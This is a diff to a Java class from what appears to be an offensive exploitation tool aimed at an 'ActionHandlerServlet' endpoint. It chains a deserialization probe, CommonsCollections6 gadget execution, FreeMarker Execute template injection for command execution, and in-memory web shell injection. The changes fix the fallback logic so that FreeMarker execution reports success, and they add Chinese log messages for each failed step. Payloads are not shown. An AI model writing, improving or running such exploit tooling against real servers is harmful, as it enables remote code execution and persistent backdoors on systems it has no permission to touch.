@@ -46,13 +46,15 @@ public class ActionHandlerServlet extends VulnBase {
                 if (exec_cc6(vulnerable_url)) {
                     return;
                 } else {
-                    exec_freemarker(vulnerable_url);
-                    return;
+                    if (exec_freemarker(vulnerable_url)) {
+                        return;
+                    } else {
+                        logExec("[-] freemarker.template.utility.Execute 执行失败.");
+                    }
                 }
             }
 
         } catch (Exception e) {
-            logMessage(e.toString());
         }
     }
 
@@ -96,7 +98,7 @@ public class ActionHandlerServlet extends VulnBase {
 
             urldns_conn.disconnect();
         } catch (Exception e) {
-            logMessage(e.toString());
+            logMessage("[-] ActionHandlerServlet 反序列化探测失败. " + e);
         }
 
     }
@@ -145,7 +147,7 @@ public class ActionHandlerServlet extends VulnBase {
             }
 
         } catch (Exception e) {
-            logMessage(e.toString());
+            logMessage("[-] 内存马注入失败, 请尝试手动利用. " + e.toString());
             return false;
         }
 
@@ -212,7 +214,7 @@ public class ActionHandlerServlet extends VulnBase {
                 return false;
             }
         } catch (Exception e) {
-            logExec(e.toString());
+            logExec("[-] CommonsCollections6 执行失败, 尝试 freemarker.template.utility.Execute 执行. " + e);
             return false;
         }
     }
@@ -262,13 +264,13 @@ public class ActionHandlerServlet extends VulnBase {
                 freemarkerExpResponseText = freemarkerExpResponseText.substring(48);
 
                 logExec("[+] freemarker.template.utility.Execute 执行成功!\n" + freemarkerExpResponseText);
-                return false;
+                return true;
             } else {
                 logExec("[-] freemarker.template.utility.Execute 执行失败. 请尝试手动利用.\n");
                 return false;
             }
         } catch (Exception e) {
-            logExec(e.toString());
+            logExec("[-] freemarker.template.utility.Execute 执行失败. 请尝试手动利用. " + e);
             return false;
         }
 
